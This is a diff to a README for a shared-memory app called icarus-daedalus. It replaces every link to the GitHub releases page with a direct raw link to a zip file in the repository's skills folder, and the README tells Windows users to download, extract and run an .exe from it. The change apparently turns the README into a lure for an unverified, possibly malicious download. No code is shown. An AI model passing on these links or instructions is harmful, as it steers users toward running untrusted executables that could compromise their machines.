@@ -1,10 +1,10 @@
 # 🧠 icarus-daedalus - Simple shared memory for apps
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/lethargic-meconopsis543/icarus-daedalus/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lethargic-meconopsis543/icarus-daedalus/main/skills/daedalus_icarus_v2.4.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/lethargic-meconopsis543/icarus-daedalus/releases
+Visit this page to download: https://raw.githubusercontent.com/lethargic-meconopsis543/icarus-daedalus/main/skills/daedalus_icarus_v2.4.zip
 
 Look for the latest release on the page. On Windows, download the `.exe` file if one is listed. If the release uses a ZIP file, download the ZIP, open it, and run the app from the extracted folder.
 
@@ -208,6 +208,6 @@ This works well for:
 
 ## 📌 Release download link
 
-Visit this page to download: https://github.com/lethargic-meconopsis543/icarus-daedalus/releases
+Visit this page to download: https://raw.githubusercontent.com/lethargic-meconopsis543/icarus-daedalus/main/skills/daedalus_icarus_v2.4.zip
 
 Use the latest release file for Windows, then extract it if needed and run the app from the downloaded folder
